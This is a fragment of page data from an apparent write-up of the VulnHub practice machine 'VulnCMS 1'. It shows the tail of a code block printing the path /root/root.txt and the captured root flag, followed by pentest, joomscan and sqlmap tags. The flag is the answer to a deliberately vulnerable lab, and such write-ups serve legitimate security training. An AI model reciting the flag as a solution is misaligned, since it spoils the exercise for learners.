/root/root.txt\n<span class=\"token number\">4359537020406305</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n","download":"https://www.vulnhub.com/entry/vulncms-1,710","tags":[{"title":"Pentest","path":"/tag/Pentest/"},{"title":"CTF","path":"/tag/CTF/"},{"title":"joomscan","path":"/tag/joomscan/"},{"title":"sqlmap","path":"/tag/sqlmap/"}],"timeToRead":8,"parts":[]}},"context":{}}